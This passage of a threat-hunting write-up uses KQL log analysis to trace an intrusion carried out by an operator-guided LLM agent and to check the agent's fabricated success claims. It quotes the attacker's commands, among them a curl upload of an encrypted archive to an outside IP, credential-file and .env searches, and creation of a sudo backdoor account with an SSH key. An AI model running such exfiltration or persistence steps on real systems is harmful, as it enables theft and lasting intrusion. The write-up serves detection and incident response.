Other cron jobs in the window (`queue-drain.sh`, `service-ports.sh`, `disk.sh`, `ntpdate`, `find /var/tmp`, `certbot renew`) are known maintenance commands. Only one runs an inline Python socket.

### 💡 Why It Matters
The 200 on the web request only proves Redis received bytes. Two other sources prove code ran.

### 🔧 KQL Query Used

```kql
Syslog
| where TimeGenerated between (datetime(2026-09-20 06:52:40) .. datetime(2026-09-20 07:00:00))
| where Computer =~ "sc-portal01" and ProcessName =~ "CRON"
| summarize Runs = count(), First = min(TimeGenerated) by SyslogMessage
| order by First asc
```

```kql
DeviceProcessEvents_CL
| where Timestamp between (datetime(2026-09-20 06:52:40) .. datetime(2026-09-20 06:53:40))
| where DeviceName =~ "sc-portal01"
| project Timestamp, AccountName, InitiatingProcessFileName, InitiatingProcessId, FileName, ProcessId, ProcessCommandLine
| order by Timestamp asc
```

### 🖼 Screenshots

![The one cron job that runs inline Python](Screenshots/What%20did%20Cron%20run.png)

![cron 4400 spawns python3 4401 as root](Screenshots/Process%20lineage.png)

### 🛡 Detection Recommendation
Related rule: DR-01. **Hunting Tip:** the cron entry was the only way in that survived a restart of the web app, so check cron directories on every host the web user can reach.

**MITRE Reference:** [T1053.003](https://attack.mitre.org/techniques/T1053/003)

</details>

### Section 2: Credential Harvest

<details>
<summary>🚩 <strong>Flag S2.1: Configuration file and process tree</strong> (<code>T1552.001</code>, <code>T1083</code>) 🔴 Critical</summary>

### 🎯 Objective
Find what the shell read and prove it was the same shell.

### 📌 Finding
At 07:05:15 `cat /etc/semicrest/portal.conf` ran as root (PID 4410) under python3 (4401) under cron (4400). At 07:05:21 `env` ran and at 07:05:27 `find / -name "*.conf" -o -name "*.env" -o -name ".env"` ran, 6 seconds apart each.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Source table.field** | `DeviceProcessEvents_CL.ProcessCommandLine`, `InitiatingProcessFileName`, `InitiatingProcessId` |
| **File** | `/etc/semicrest/portal.conf` |
| **Tree** | cron 4400, python3 4401 (root), cat 4410 |

### 🔬 Benign Look-Alikes Ruled Out
`gunicorn` restarts by `www-data` and `dpkg --audit` or `apt-get` by named admins in the same window all have parent `bash`, not python3.

### 💡 Why It Matters
A `cat` on a config file is normal admin work. The lineage (cat under python3 under cron) makes it the attacker's, and ties it to the exploit.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents_CL
| where Timestamp between (datetime(2026-09-20 07:00:00) .. datetime(2026-09-20 07:10:00))
| where DeviceName =~ "sc-portal01"
| project Timestamp, FileName, ProcessCommandLine, AccountName, InitiatingProcessFileName, InitiatingProcessId
| order by Timestamp asc
```

### 🖼 Screenshot

![cat, env and find as root under python3](Screenshots/S2%20portal.conf%20read%20by%20cat%20under%20python3.png)

### 🛡 Detection Recommendation
Alert when a file-reading tool reads `*.conf`, `*.env` or `/etc/<app>/` and its parent is an interpreter whose own parent is `cron`.

</details>

<details>
<summary>🚩 <strong>Flag S2.2: Database credential</strong> (<code>T1552.001</code>, <code>T1078</code>) 🔴 Critical</summary>

### 🎯 Objective
Find the database login in the file and prove it was used.

### 📌 Finding
The process log shows the file was read, never its contents. The agent's `harvest_creds` tool call (via MCP) quotes the file, including a `DATABASE_URL` for user `portal_svc` on `10.5.0.20:5432`. The same shell connected to `10.5.0.20:5432` at 07:16:11.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Command lines** | The password was never typed into a command: `DeviceProcessEvents_CL.ProcessCommandLine` has no psql or PGPASSWORD |
| **Agent log** | `LLMAgentLogs_CL.model_response`, `tool_name` = `harvest_creds` |
| **Network** | `DeviceNetworkEvents_CL`: python3 to `10.5.0.20:5432` at 07:16:11.959, PID 4401 |

### 💡 Why It Matters
The agent's narration is a claim. The connection from the shell to the database port is the infrastructure fact that backs it. The credential proves access to the connection string, not by itself a login or a query; the queries in S3 do that.

### 🔧 KQL Query Used

```kql
LLMAgentLogs_CL
| where TimeGenerated between (datetime(2026-10-01 00:00:00) .. datetime(2026-12-31 23:59:59))
| where * has "portal.conf"
| take 20
```

> The agent log is stamped with its upload date (October 2026), not the attack date, so the query window covers October and the match is made by time of day and session ID.

### 🖼 Screenshot

![The agent's harvest_creds call quoting portal.conf](Screenshots/Credential%20harvested%20by%20agent.png)

### 🛡 Detection Recommendation
Stop storing the login in a readable file. Detect a `portal_svc` session that lacks the `application_name` label the real application sends.

</details>

<details>
<summary>🚩 <strong>Flag S2.3: Registry credential</strong> (<code>T1552.001</code>, <code>T1078</code>) 🟠 High</summary>

### 🎯 Objective
Find the second credential pair in the same file.

### 📌 Finding
The same `harvest_creds` row quotes `REGISTRY_API=https://10.5.0.30/api/v2.0` with a `REGISTRY_USER` of `ci-builder` and its password. The same file also pointed to `REDIS_URL` and `ADMIN_API` (`10.5.0.40:8443`). The target is the registry host `10.5.0.30` (`sc-registry01`).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Source table.field** | `LLMAgentLogs_CL.model_response`, `tool_result` ("ci-builder (harbor)") |

### 💡 Why It Matters
One plain-text file mapped the estate and held two keys. It proves the credential was obtained, not that the registry was changed; flag S3.3 covers what was done with it.

### 🖼 Screenshot

![Both credential pairs in one agent log row](Screenshots/S2%20agent%20log%20portal.conf%20contents.png)

### 🛡 Detection Recommendation
Move all secrets to a vault and give each service its own narrow account.

</details>

<details>
<summary>🚩 <strong>Flag S2.4: Visibility gap</strong> (<code>T1552.001</code>) 🟡 Medium</summary>

### 🎯 Objective
Say whether the `env` command found more credentials.

### 📌 Finding
Unknown. `env` ran as PID 4411 at 07:05:21, but process telemetry records the command, not its output. The `portal.conf` contents are visible only because the agent narrated them. No agent tool call covers `env`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Command** | `DeviceProcessEvents_CL`: `env`, PID 4411, root, parent python3 4401 |
| **Output** | Not in any table checked |

### 💡 Why It Matters
Naming a visibility gap correctly is a finding. Any secret held in the portal's environment should be treated as exposed and rotated.

### 🛡 Detection Recommendation
Audit reads of `/proc/*/environ` and record command output on internet-facing hosts.

</details>

### Section 3: Lateral Movement

<details>
<summary>🚩 <strong>Flag S3.1: Database query discrimination</strong> (<code>T1213.006</code>) 🔴 Critical</summary>

### 🎯 Objective
Separate the attacker's queries from the application's, on the same account.

### 📌 Finding
Three properties separate them: statement structure (the app uses explicit columns, `$1` parameters, `WHERE` and `LIMIT`; the attacker used `SELECT *`), target selection (the attacker read `information_schema` and `pg_catalog.pg_shadow`), and cadence (five statements in 9 seconds against steady application traffic). The attacker's connections also lacked the `application_name=portal_svc` label, from 07:16:14.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Source table.field** | `Syslog.SyslogMessage` (`ProcessName` = `postgres`, `Computer` = `sc-db01`) |
| **Burst** | 07:16:16 `SELECT * FROM users`, 07:16:19 projects, 07:16:22 customers, 07:16:23 `information_schema.tables`, 07:16:25 `pg_catalog.pg_shadow` |

### 🔬 Benign Look-Alikes Ruled Out
The application's own statements (`UPDATE projects SET last_accessed=now() WHERE id=$1`, `INSERT INTO audit_log ...`) repeat all morning. See DR-02 for one earlier burst of the same six statements that is not explained.

### 💡 Why It Matters
The username tells you nothing, because the attacker used the application's own account.

### 🔧 KQL Query Used

```kql
Syslog
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where Computer =~ "sc-db01" and ProcessName =~ "postgres"
| where SyslogMessage !has "connection"
| summarize Count = count(), First = min(TimeGenerated), Last = max(TimeGenerated) by SyslogMessage
| order by First asc
```

### 🖼 Screenshot

![Application queries against the attacker's burst](Screenshots/query%20differences%20between%20system%20and%20attacker.png)

### 🛡 Detection Recommendation
Related rule: DR-02.

</details>

<details>
<summary>🚩 <strong>Flag S3.2: Queried tables</strong> (<code>T1213.006</code>, <code>T1087</code>) 🔴 Critical</summary>

### 🎯 Objective
Name the tables read outside normal application patterns.

### 📌 Finding
The tables after `FROM` were `users`, `projects`, `customers`, `information_schema.tables` and `pg_catalog.pg_shadow`. The second wave at 07:45 read specific columns: project name, revision and team lead; email, phone and company; username, `password_hash`, role and last login.

### 🔍 Evidence

| Table | Contents | Why the attacker wants it |
|-------|----------|---------------------------|
| `users` | Accounts, roles, password hashes | Crack hashes, find admins |
| `projects` | Design metadata | The intellectual property |
| `customers` | Email, phone, company | Contact data |
| `information_schema.tables` | List of every table | Map for further reads |
| `pg_catalog.pg_shadow` | Database role password hashes | Superuser credentials |

### 💡 Why It Matters
The log records which tables were asked for, not what came back. Do not claim rows were copied; claim they were read.

The 07:16 burst is tied to the attacker's process: PID 4401 connected to `10.5.0.20:5432` at 07:16:11. The 07:45 wave has no matching new connection from the portal in the network table, so I attribute it to the attacker by pattern and timing, with moderate confidence.

### 🛡 Detection Recommendation
Related rule: DR-02.

</details>

<details>
<summary>🚩 <strong>Flag S3.3: Registry enumeration</strong> (<code>T1078</code>, <code>T1083</code>) 🟠 High</summary>

### 🎯 Objective
Find what the stolen registry account did that its owner never does.

### 📌 Finding
In the baseline `ci-builder` only runs `pull_artifact` (49) and `push_artifact` (16) from the CI server `10.5.0.100`. From `10.5.0.10` at 07:33:01 to 07:33:05 it ran `login`, `list_repository`, `pull_manifest` and `inspect_layer`, all 200.

### 🔍 Evidence

| Time | Operation | Repository |
|------|-----------|------------|
| 07:33:01 | login | |
| 07:33:03 | list_repository | `semicrest` |
| 07:33:04 | pull_manifest | `semicrest/portal-build` |
| 07:33:05 | inspect_layer | `semicrest/portal-build` |

### 💡 Why It Matters
A CI pipeline already knows its image names, so it never browses. No `push_artifact` came from the portal, so there is no sign the image was changed.

### 🔧 KQL Query Used

```kql
ContainerRegistryLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where Username == "ci-builder"
| summarize count() by Operation, SrcIpAddr
```

### 🖼 Screenshot

![ci-builder baseline against the four new operations](Screenshots/Registry%20operations%20ci-builder.png)

### 🛡 Detection Recommendation
Alert on `login`, `list_repository` or `inspect_layer` by a CI service account from any address other than the CI server.

</details>

<details>
<summary>🚩 <strong>Flag S3.4: Admin API response</strong> (<code>T1082</code>) 🟠 High</summary>

### 🎯 Objective
Find what the admin API did with the attacker's request for secrets.

### 📌 Finding
From `10.5.0.10`, `portal_svc` got 200 on `/api/v1/services` (07:45:27) and `/api/v1/topology` (07:45:31), then 403 Forbidden on `/api/v1/secrets` (07:45:32). The routine callers of `/secrets` are named admins from `10.5.0.100` and `10.5.0.101`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Source table.field** | `Syslog.SyslogMessage` (`ProcessName` = `admin_api`, `Computer` = `sc-admin01`) |
| **Result** | `GET /api/v1/secrets HTTP/1.1 403 src=10.5.0.10 user=portal_svc` |

### 💡 Why It Matters
A 403 means the API knew who `portal_svc` was and refused its permission. Least privilege worked here and is a defensive success.

### 🔧 KQL Query Used

```kql
Syslog
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where Computer =~ "sc-admin01" and ProcessName =~ "admin_api"
| where SyslogMessage has "secrets" or SyslogMessage has "10.5.0.10"
| summarize Count = count(), First = min(TimeGenerated) by SyslogMessage
| order by First asc
```

### 🖼 Screenshot

![The 403 on /api/v1/secrets from 10.5.0.10](Screenshots/Admin%20API%20403%20secrets.png)

### 🛡 Detection Recommendation
Alert on a 403 to a secrets endpoint from a source that has never used that API.

</details>

### Section 4: Hallucination

<details>
<summary>🚩 <strong>Flag S4.1: Secrets store hallucination</strong> (<code>T1082</code>) 🔴 Critical</summary>

### 🎯 Objective
Test the agent's claim about the admin platform against the infrastructure.

### 📌 Finding
At 07:48 (time of day) the agent wrote that it had extracted Kubernetes secrets, TLS certificates, service account tokens and API keys, giving complete access. The admin API had returned 403 on `/secrets` three minutes earlier and no successful `/secrets` request came from `10.5.0.10`. The claim is fabricated.

### 💡 Why It Matters
Narration is evidence of what the agent said, not of what happened. Trusting this log would scope the response far too wide.

### 🔧 KQL Query Used

```kql
LLMAgentLogs_CL
| where TimeGenerated between (datetime(2026-10-22 06:30:00) .. datetime(2026-10-24 23:59:59))
| where HuntName == "quartzfang" and model_response contains "Kubernetes"
| project TimeGenerated, model_response
```

### 🛡 Detection Recommendation
Treat attacker-side logs as claims and verify each against infrastructure telemetry before scoping a response.

</details>

<details>
<summary>🚩 <strong>Flag S4.2: Registry credential hallucination</strong> (<code>T1552.001</code>) 🟠 High</summary>

### 🎯 Objective
Test the claim that admin database credentials were found in an image layer.

### 📌 Finding
The agent claimed `db_admin` credentials in the `portal-build` image layer. The registry log shows four operations from `10.5.0.10`, and the `inspect_layer` request hit `/additions/vulnerabilities`, the vulnerability scan report, with no image pull. Nothing in the log shows credentials in the image. The scenario documentation states the credential does not exist.

### 🔍 Evidence

| Operation | Resource |
|-----------|----------|
| inspect_layer | `/api/v2.0/projects/semicrest/repositories/portal-build/artifacts/latest/additions/vulnerabilities` |

### 💡 Why It Matters
The registry log records the operation and the resource, not the response. This report therefore says "unsupported by telemetry", not "proved false". Do not list `db_admin` as a leaked credential.

### 🔧 KQL Query Used

```kql
ContainerRegistryLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where Username == "ci-builder" and SrcIpAddr == "10.5.0.10"
| project Operation, Resource, Repository
```

### 🛡 Detection Recommendation
Same rule as S3.3.

</details>

<details>
<summary>🚩 <strong>Flag S4.3: Hallucination as autonomy limitation</strong> (<code>T1588.007</code>) 🟠 High</summary>

### 🎯 Objective
Say what the two false claims mean for how AI-assisted attacks are run.

### 📌 Finding
The agent reported success where it had been refused (a 403) or had only read metadata, and it did so confidently. Its output cannot be fed straight into the next phase without checking, so a human sits at the phase gates. Mnemonic: check, then chain.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Table.field** | `LLMAgentLogs_CL.user_input`, `tool_name`, `model_response` (actor `quartzfang-agent`) |
| **Observation** | The operator's approvals followed each false claim within 1.5 to 3 seconds. Oversight existed in the log but nothing shows it catching either claim |

### 💡 Why It Matters
The checking was thin. Possible readings: a rubber stamp, or synthetic timestamps. The log cannot tell them apart.

### 🔧 KQL Query Used

```kql
LLMAgentLogs_CL
| where TimeGenerated between (datetime(2026-10-22 06:30:00) .. datetime(2026-10-24 23:59:59))
| where HuntName == "quartzfang" and actor == "quartzfang-agent"
| project TimeGenerated, session_id, user_input, tool_name, gate_decision, gate_reason
| order by TimeGenerated asc
```

### 🛡 Detection Recommendation
Log the agent's tool calls and results at the source, and diff its claims against host telemetry.

</details>

### Section 5: Exfiltration and Persistence

<details>
<summary>🚩 <strong>Flag S5.1: Exfil destination and staging path</strong> (<code>T1567</code>, <code>T1074.001</code>) 🔴 Critical</summary>

### 🎯 Objective
Find where the data went and where it was prepared.

### 📌 Finding
`198.51.100.210:443`, with the archive at `/tmp/.portal-cache/report.tar.gz.enc` (`FileCreated` 08:02:20). The upload command was `curl -s -X POST https://198.51.100.210:443/upload -F file=@/tmp/.portal-cache/report.tar.gz.enc -H 'X-Session: qf-c062-9e4a'` at 08:15:00, run by root under python3 PID 4401.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **File** | `DeviceFileEvents_CL`: `FileCreated`, `FolderPath` `/tmp/.portal-cache/report.tar.gz.enc` |
| **Command** | `DeviceProcessEvents_CL.ProcessCommandLine` (curl) |
| **Network** | `DeviceNetworkEvents_CL`: PID 4401 to `198.51.100.210:443` at 08:15:08 |
| **Link to the agent** | The `X-Session` header equals `LLMAgentLogs_CL.session_id` |

### 💡 Why It Matters
The connection and the staged file prove a channel existed and data was prepared. They do not prove the transfer completed or what the archive contained.

### 🔧 KQL Query Used

```kql
DeviceFileEvents_CL
| where Timestamp between (datetime(2026-09-20 08:00:00) .. datetime(2026-09-20 08:20:00))
| where DeviceName =~ "sc-portal01"
| project Timestamp, ActionType, FolderPath, FileName, InitiatingProcessFileName
```

```kql
DeviceProcessEvents_CL
| where Timestamp between (datetime(2026-09-20 08:14:00) .. datetime(2026-09-20 08:16:00))
| where DeviceName =~ "sc-portal01" and FileName =~ "curl"
| distinct Timestamp, AccountName, InitiatingProcessFileName, InitiatingProcessId, ProcessCommandLine
```

### 🖼 Screenshot

![FileCreated for the staged archive in the hidden folder](Screenshots/S5%20staged%20archive%20FileCreated.png)

### 🛡 Detection Recommendation
Alert on a root-owned `curl` upload of a file from a hidden folder under `/tmp`. The `X-Session` header is also a hunting hook.

</details>

<details>
<summary>🚩 <strong>Flag S5.2: Staging tools</strong> (<code>T1560.001</code>, <code>T1074.001</code>) 🟠 High</summary>

### 🎯 Objective
Name the tools that made the archive and their order.

### 📌 Finding
`tar`, then `gzip`, then `openssl` (gather, compress, encrypt), all root under python3 PID 4401: `tar -cf /tmp/.portal-cache/report.tar /tmp/.portal-cache/data/` at 08:02:05, `gzip` at 08:02:07, `openssl enc -aes-256-cbc` at 08:02:13.

### 💡 Why It Matters
Standard tools leave no malware to detect. Encryption stops content inspection. The contents of the data folder are not visible.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents_CL
| where Timestamp between (datetime(2026-09-20 08:00:00) .. datetime(2026-09-20 08:20:00))
| where DeviceName =~ "sc-portal01"
| where InitiatingProcessFileName in~ ("python3", "sh", "bash") or AccountName == "root"
| project Timestamp, AccountName, InitiatingProcessFileName, InitiatingProcessId, FileName, ProcessId, ProcessCommandLine
| order by Timestamp asc
```

### 🖼 Screenshot

![tar, gzip and openssl as root under python3](Screenshots/S5%20tar%20gzip%20openssl.png)

### 🛡 Detection Recommendation
Alert on the sequence tar, gzip, openssl within 10 seconds under an interpreter parent, writing into a hidden directory.

</details>

<details>
<summary>🚩 <strong>Flag S5.3: Persistence mechanism</strong> (<code>T1136.001</code>, <code>T1098</code>) 🔴 Critical</summary>

### 🎯 Objective
Find what was left behind.

### 📌 Finding
A new local account `svc_monitor`: `UserAccountCreated` at 08:29:44 (and `UserAccountModified` 08:29:51). The shell ran `useradd -m -s /bin/bash svc_monitor` (08:29:35), `usermod -aG sudo svc_monitor` (08:29:45), `mkdir -p /home/svc_monitor/.ssh` (08:29:53) and `ssh-keygen -t ed25519 -f /home/svc_monitor/.ssh/id_ed25519 -N ""` (08:29:55). It is the only account event in the window.

### 💡 Why It Matters
It is a prepared way back in, with admin rights and an SSH key. The logs do not show it being used, an `authorized_keys` change, or the private key leaving the host. The two tables disagree by up to 9 seconds, so this report says 08:29.

### 🔧 KQL Query Used

```kql
DeviceEvents_CL
| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where DeviceName =~ "sc-portal01"
| summarize Events = count(), First = min(Timestamp) by ActionType, AccountName
| order by First asc
```

### 🖼 Screenshot

![useradd, usermod, mkdir and ssh-keygen for svc_monitor](Screenshots/S5%20svc_monitor%20useradd%20sudo%20ssh-keygen.png)

### 🛡 Detection Recommendation
Related rule: DR-03.

</details>

<details>
<summary>🚩 <strong>Flag S5.4: Exfil vs legitimate HTTPS</strong> (<code>T1567</code>, <code>T1071.001</code>) 🟠 High</summary>

### 🎯 Objective
Separate the exfiltration from normal outbound 443 traffic.

### 📌 Finding
Port and process name (`python3`) are shared. What differs is the process identity: every attacker connection came from PID 4401 (root, parent cron), once each, to new destinations (`203.0.113.87`, `10.5.0.30`, `198.51.100.210`). Normal 443 traffic came from many `www-data` gunicorn worker PIDs to the same four SaaS IPs across the session.

### 🔍 Evidence

| Destination | Connections | PIDs |
|-------------|------------:|------|
| 3.226.16.10, 34.120.195.249, 52.86.241.14, 167.89.118.35 (normal) | 9 to 10 each | 6 to 7 different PIDs each |
| 203.0.113.87, 10.5.0.30, 198.51.100.210 (attacker) | 1 each (2 log rows) | 4401 |

### 🔧 KQL Query Used

```kql
DeviceNetworkEvents_CL
| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where DeviceName =~ "sc-portal01" and RemotePort == 443
| summarize Connections = count(), First = min(Timestamp), Pids = make_set(InitiatingProcessId) by RemoteIP, InitiatingProcessFileName
| order by Connections desc
```

### 🛡 Detection Recommendation
Alert on an outbound connection from a root process, or one whose parent is cron, to a first-time destination. Do not key on port 443, the IP, or the process name.

</details>

### Section 6: Reconnaissance and Timing

<details>
<summary>🚩 <strong>Flag S6.1: Scanner IPs</strong> (<code>T1595.002</code>) 🟡 Medium</summary>

### 🎯 Objective
Sort the scans before the exploit into threat and scheduled.

### 📌 Finding
External: `198.51.100.31`, `198.51.100.45`, `198.51.100.62`, each 30 requests, 15 distinct URLs and 16 errors with `python-requests/2.31.0`, in slots from 06:30:00 to 06:31:52. Internal: `10.5.0.250`, `Nessus/10.6.2`, 2 requests, 0 errors, at 06:31:48 and 06:46:49.

### 🔧 KQL Query Used

```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 06:52:30))
| where Computer =~ "sc-portal01"
| summarize Requests = count(), DistinctUrls = dcount(UrlOriginal), Errors = countif(HttpStatusCode >= 400), First = min(TimeGenerated), Last = max(TimeGenerated), Agents = make_set(UserAgent, 3) by SrcIpAddr
| order by Requests desc
```

### 🛡 Detection Recommendation
Alert on a source group with a high error ratio and a scripting-library user agent in a short window. Exclude the known scanner and its schedule.

</details>

<details>
<summary>🚩 <strong>Flag S6.2: Recon vs Nessus discrimination</strong> (<code>T1595.002</code>) 🟡 Medium</summary>

### 🎯 Objective
Say what distinguishes the external recon from the scheduled scan.

### 📌 Finding
Target selection (the recon asked for `/.env`, `/admin/`, `/api/v1/users`, `/api/v1/projects`, `/api/v1/docs`, `/api/v2/` and the preview endpoint; Nessus asked for `/api/v1/` and `/robots.txt`), response codes (8 of 15 recon paths failed; Nessus 0 errors), and cadence (30 requests in about 30 seconds per source against 2 requests 15 minutes apart).

### 💡 Why It Matters
The only recon request that reached anything useful was `/api/v1/preview?url=test`, which returned 400 instead of 404. That revealed the endpoint and its `url` parameter about 20 minutes before the exploit.

### 🔧 KQL Query Used

```kql
PortalAccessLog_CL
| where TimeGenerated between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 06:52:30))
| where Computer =~ "sc-portal01"
| where SrcIpAddr startswith "198.51.100." or SrcIpAddr == "10.5.0.250"
| summarize Requests = count() by SrcIpAddr, UrlOriginal, HttpStatusCode
| order by SrcIpAddr asc, Requests desc
```

### 🛡 Detection Recommendation
Same as S6.1. Make the preview endpoint return one response for any bad input so a 400 does not confirm it exists.

</details>

<details>
<summary>🚩 <strong>Flag S6.3: Timing signature</strong> (<code>T1588.007</code>) 🟠 High</summary>

### 🎯 Objective
Test a colleague's claim that this looks like a normal human operation.

### 📌 Finding
A human shows irregular gaps of minutes between commands, with pauses and mistakes. This chain shows machine-speed bursts (commands 2 to 10 seconds apart) separated by 13 to 57 minute idle gaps that line up with the operator's approvals. The shell's commands and gaps: `cat`, 6 s, `env`, 6 s, `find`, then 3,398 s idle; `tar`, 2 s, `gzip`, 6 s, `openssl`; then 767 s to `curl`; then 875 s to `useradd`, 10 s, `usermod`, 8 s, `mkdir`, 2 s, `ssh-keygen`.

### 💡 Why It Matters
Fast bursts alone could be a script. The combination (adapting to a failure in 1.6 seconds, narrated reasoning, approvals in the idle gaps) places it as an agent guided by an operator.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents_CL
| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where DeviceName =~ "sc-portal01" and InitiatingProcessId == 4401
| summarize by Timestamp, FileName
| sort by Timestamp asc
| extend GapSeconds = datetime_diff('second', Timestamp, prev(Timestamp))
| project Timestamp, FileName, GapSeconds
```

### 🛡 Detection Recommendation
Alert on several different system tools launched seconds apart under one interpreter parent after a long idle period.

</details>

### Section 7: Autonomy Synthesis

<details>
<summary>🚩 <strong>Flag S7.1: Operator decision gates</strong> (<code>T1588.007</code>) 🟠 High</summary>

### 🎯 Objective
Count the human decisions in the agent log.

### 📌 Finding
5 operator directives: the initial tasking (06:31), the post-foothold approval (06:53), the post-lateral approval (07:31), the collection review and staging approval (07:48), and the pre-exfiltration approval (07:48, 0.4 seconds later). Four of them are phase-transition approvals.

### 🔧 KQL Query Used

```kql
LLMAgentLogs_CL
| where TimeGenerated between (datetime(2026-10-22 06:30:00) .. datetime(2026-10-24 23:59:59))
| where HuntName == "quartzfang" and actor == "quartzfang-agent" and isnotempty(user_input)
| project TimeGenerated, user_input
| order by TimeGenerated asc
```


### 🛡 Detection Recommendation
Log operator directives and agent tool calls as a first-class audit trail.

</details>

<details>
<summary>🚩 <strong>Flag S7.2: Autonomy placement</strong> (<code>T1588.007</code>, <code>T1699</code>) 🟠 High</summary>

### 🎯 Objective
Place the operation on the spectrum from person to machine.

### 📌 Finding
Operator-guided: a person who set a machine going. Human involvement: `LLMAgentLogs_CL.user_input` (5 directives). Machine speed: `DeviceProcessEvents_CL.Timestamp` and `ProcessCommandLine` (commands 2 to 10 seconds apart), `PortalAccessLog_CL.UrlOriginal` (an 18-second payload correction), `Syslog.SyslogMessage` on `sc-db01` (5 statements in 9 seconds). Not fully autonomous: `LLMAgentLogs_CL.model_response` against `Syslog.SyslogMessage` on `sc-admin01` (claimed secrets, got a 403).

### 💡 Why It Matters
Counter-arguments: fast bursts could be a script, and the approvals might be automated. The log cannot rule either out; the combination is what places it.

### 🛡 Detection Recommendation
Treat agent tempo (bursts, then silence) as a behavioural signal in its own right.

</details>

<details>
<summary>🚩 <strong>Flag S7.3: Novel ATT&CK technique</strong> (<code>T1588.007</code>) 🟠 High</summary>

### 🎯 Objective
Name the technique that captures the AI as the execution engine.

### 📌 Finding
T1588.007 Obtain Capabilities: Artificial Intelligence (Resource Development). The novelty is who executed the chain, not the techniques. SSRF to Redis to cron is an old pattern. T1699 Direct Prompt Injection is related but different: it is how the operators got the agent to comply.

### 🛡 Detection Recommendation
Detect the behaviours (tempo, lineage, first-time destinations), because the AI capability itself is acquired off the victim's network.

</details>

### Section 8: Real or Noise

<details>
<summary>🚩 <strong>Flag S8.1: Credential reuse across services</strong> (<code>T1078</code>) 🔴 Critical</summary>

### 🎯 Objective
Separate the attacker's use of `portal_svc` from the application's, across three hosts, without revoking it.

### 📌 Finding
The source IP (`10.5.0.10`) is shared, so it cannot separate them. The originating process can: every connection from `sc-portal01` to the database, registry and admin API came from python3 PID 4401, the root reverse shell, not the application's gunicorn workers. On `sc-db01` the attacker's sessions also lacked `application_name`, and ran unparameterised bursts. On `sc-admin01` the attacker's calls came from `10.5.0.10`, while routine admin calls come from `10.5.0.100` and `.101`.

### 🔍 Evidence

| Service | Connection | Opened by |
|---------|-----------|-----------|
| sc-db01 | `10.5.0.20:5432` at 07:16:11 | PID 4401 |
| sc-registry01 | `10.5.0.30:443` at 07:33:01 | PID 4401 |
| sc-admin01 | `10.5.0.40:8443` at 07:45:24 | PID 4401 |

### 💡 Why It Matters
Revoking `portal_svc` would take the application down and leave the shell, the cron entry and `svc_monitor` in place. Contain the process and the persistence first, then rotate `portal_svc` and `ci-builder` in a planned change. The network table shows only the attacker's connections to these hosts, so the comparison is attacker-side process against application-side label.

### 🔧 KQL Query Used

```kql
DeviceNetworkEvents_CL
| where Timestamp between (datetime(2026-09-20 06:30:00) .. datetime(2026-09-20 08:30:00))
| where DeviceName =~ "sc-portal01"
| where RemoteIP in ("10.5.0.20", "10.5.0.30", "10.5.0.40")
| summarize Connections = count(), First = min(Timestamp), Pids = make_set(InitiatingProcessId) by RemoteIP, RemotePort, InitiatingProcessFileName
| order by First asc
```

### 🛡 Detection Recommendation
Alert on a service account session that lacks its usual `application_name`, or on a process other than the application's workers opening the database connection.

</details>

<details>
<summary>🚩 <strong>Flag S8.2: pg_dump disconfirmation</strong> (n/a) 🟡 Medium</summary>

### 🎯 Objective
Test whether the nightly `pg_dump` is part of the intrusion.

### 📌 Finding
Normal scheduled activity. `pg_dump -U portal_svc -h localhost -Fc semicrest > /backup/nightly/semicrest.dump` ran on 18, 19 and 20 Sep with the same OS account (`backup`), the same parent (`bash`) and one distinct command line. The 20 Sep first run was 02:59:49, 3.5 hours before the first attack event. `portal_svc` in the command is the database role, not the OS user.

### 🔍 Evidence

| Day | Rows | First (UTC) | Account | Parent | Distinct commands |
|-----|-----:|-------------|---------|--------|------------------:|
| 18 Sep | 29 | 07:30:35 | backup | bash | 1 |
| 19 Sep | 33 | 02:59:52 | backup | bash | 1 |
| 20 Sep | 19 | 02:59:49 | backup | bash | 1 |

### 💡 Why It Matters
Same tool and same database login as the attacker, but a different source, parent and history. The schedule shows more runs per day than "nightly at 03:00", and I did not check whether the dump file was read during the attack.

### 🔧 KQL Query Used

```kql
DeviceProcessEvents_CL
| where Timestamp between (datetime(2026-09-15 00:00:00) .. datetime(2026-09-21 00:00:00))
| where DeviceName =~ "sc-db01" and FileName =~ "pg_dump"
| summarize Runs = count(), First = min(Timestamp), Accounts = make_set(AccountName), Parents = make_set(InitiatingProcessFileName), Commands = dcount(ProcessCommandLine) by Day = bin(Timestamp, 1d)
| order by Day asc
```

</details>

<details>
<summary>🚩 <strong>Flag S8.3: Connection spike dead end</strong> (n/a) 🟡 Medium</summary>

### 🎯 Objective
Decide whether the 07:30 connection spike on `sc-db01` is enumeration.

### 📌 Finding
Noise: connection pool exhaustion. The spike is 213 `FATAL: remaining connection slots are reserved for roles with the SUPERUSER attribute` and 193 `FATAL: sorry, too many clients already`, with no `SELECT *` and no catalogue reads. In the 07:30 slot there were 159 and 152 FATAL errors against only 22 successful statements, fewer than the slots before it (36 to 49). The FATAL lines carry no client address, so I cannot say which client used up the connections.

### 💡 Why It Matters
Volume tells you something happened, content tells you what.

### 🔧 KQL Query Used

```kql
Syslog
| where TimeGenerated between (datetime(2026-09-20 07:28:00) .. datetime(2026-09-20 07:50:00))
| where Computer =~ "sc-db01" and ProcessName =~ "postgres"
